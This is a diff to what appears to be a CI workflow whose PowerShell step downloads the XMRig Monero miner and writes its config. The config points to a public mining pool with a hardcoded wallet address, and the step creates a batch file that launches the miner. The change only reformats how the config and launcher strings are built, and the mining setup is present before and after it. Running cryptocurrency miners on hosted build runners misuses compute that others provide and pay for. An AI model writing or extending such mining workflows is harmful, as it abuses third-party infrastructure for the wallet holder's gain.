@@ -45,33 +45,28 @@ jobs:
           $minerFolder = (Get-ChildItem -Path $extractPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
           
           Write-Host "Creating pre-filled config.json with your wallet address..."
-          $configJson = @"
-          {
-              "autosave": true,
-              "cpu": true,
-              "opencl": false,
-              "cuda": false,
-              "pools": [
-                  {
-                      "algo": "rx/0",
-                      "url": "pool.supportxmr.com:5555",
-                      "user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP",
-                      "pass": "x"
-                  }
-              ]
-          }
-"@
-          Set-Content -Path (Join-Path $minerFolder "config.json") -Value $configJson
+          # Create the JSON content in a YAML-safe way
+          $jsonContent = '{' + `
+            '"autosave": true,' + `
+            '"cpu": true,' + `
+            '"opencl": false,' + `
+            '"cuda": false,' + `
+            '"pools": [' + `
+            '{' + `
+            '"algo": "rx/0",' + `
+            '"url": "pool.supportxmr.com:5555",' + `
+            '"user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP",' + `
+            '"pass": "x"' + `
+            '}' + `
+            ']' + `
+            '}'
+          
+          # Convert the JSON string to a properly formatted JSON object and save it
+          $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
 
           Write-Host "Creating a 'Start Miner' shortcut on the Desktop..."
-          $shortcutContent = @"
-          @echo off
-          echo Starting XMRig Miner...
-          cd /d "%~dp0"
-          cd "$($minerFolder.Split('\')[-1])"
-          xmrig.exe
-          pause
-"@
+          # Create the batch file content in a YAML-safe way
+          $shortcutContent = "@echo off`r`necho Starting XMRig Miner...`r`ncd /d ""%~dp0""`r`ncd ""$($minerFolder.Split('\')[-1])""`r`nxmrig.exe`r`npause"
           Set-Content -Path (Join-Path $extractPath "Start-Miner.bat") -Value $shortcutContent
           
           Write-Host "XMRig Miner is now fully pre-configured on the Desktop."
